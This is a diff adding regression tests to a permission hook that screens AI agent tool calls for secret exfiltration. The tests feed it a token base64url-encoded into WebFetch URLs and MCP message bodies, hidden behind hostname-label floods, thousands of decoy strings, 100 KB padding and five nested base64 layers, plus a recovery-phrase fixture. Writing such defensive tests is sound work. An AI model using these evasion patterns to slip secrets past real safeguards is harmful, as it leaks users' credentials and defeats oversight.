@@ -280,6 +280,69 @@ describe('Issue 338 review 3: MCP shell routing through the built hook', () => {
   });
 });
 
+// Third review of #338, stage B: decode limits that failed open (design section 10).
+describe('Issue 338 review 3: encoded secret budgets through the built hook', () => {
+  const b64url = (s: string) => Buffer.from(s).toString('base64url');
+  const labels = (n: number) => Array(n).fill('aa').join('.');
+  const decision = (result: ReturnType<typeof check>) =>
+    result.body?.hookSpecificOutput?.permissionDecision ?? 'allow';
+
+  it('blocks an encoded secret behind a flood of hostname labels', () => {
+    expect(
+      check('WebFetch', {
+        url: `https://${labels(700)}.fixture.invalid/?q=${b64url(token)}`,
+        prompt: 'p',
+      }).status
+    ).toBe(2);
+    expect(
+      check('mcp__ops__send_message', { a: `https://${labels(700)}.x/`, b: b64url(token) }).status
+    ).toBe(2);
+  });
+  it('blocks an encoded secret after many decoding decoys and after 100 KB of padding', () => {
+    const decoys = Array.from({ length: 4200 }, (_, i) => b64url('decoy text number ' + i));
+    expect(
+      check('mcp__ops__send_message', { body: decoys.join(' ') + ' ' + b64url(token) }).status
+    ).toBe(2);
+    expect(
+      check('mcp__ops__send_message', { body: 'x'.repeat(100_000) + ' ' + encoded }).status
+    ).toBe(2);
+  });
+  it('blocks a plain recovery phrase behind label filler', () => {
+    const result = check('mcp__ops__send_message', {
+      a: `https://${labels(160)}.x/`,
+      b: mnemonicFixture(),
+    });
+    expect(result.status).toBe(2);
+  });
+  it('reviews a layer past the decoding depth', () => {
+    let value = token;
+    for (let i = 0; i < 5; i++) value = Buffer.from(value).toString('base64');
+    expect(decision(check('mcp__ops__send_message', { body: value }))).toBe('ask');
+  });
+  it('lets the BIP-39 word list itself be written', () => {
+    expect(
+      check('Write', { file_path: 'wordlist.txt', content: BIP39_ENGLISH.join('\n') })
+    ).toEqual({ status: 0, body: null });
+  });
+  it('keeps the encoded secret out of the audit row of a PostToolUse log', () => {
+    const value = b64url(token);
+    const payload = JSON.stringify({
+      hook_event_name: 'PostToolUse',
+      tool_name: 'WebFetch',
+      tool_input: { url: `https://${labels(700)}.fixture.invalid/?q=${value}`, prompt: 'p' },
+      tool_response: { output: 'ok' },
+      session_id: 'issue338',
+      tool_use_id: 'issue338-log',
+      cwd: home,
+    });
+    run(['log'], payload);
+    const audit = fs.readFileSync(path.join(home, '.node9/audit.log'), 'utf8');
+    expect(audit).toContain('WebFetch');
+    expect(audit).not.toContain(value);
+    expect(audit).not.toContain(token);
+  });
+});
+
 // Same convention as mcp-gateway.integration.test.ts: the gateway's stdio
 // piping of a quoted Windows upstream path is not exercised on win32.
 describe.skipIf(process.platform === 'win32')('Issue 338 through the real MCP gateway', () => {
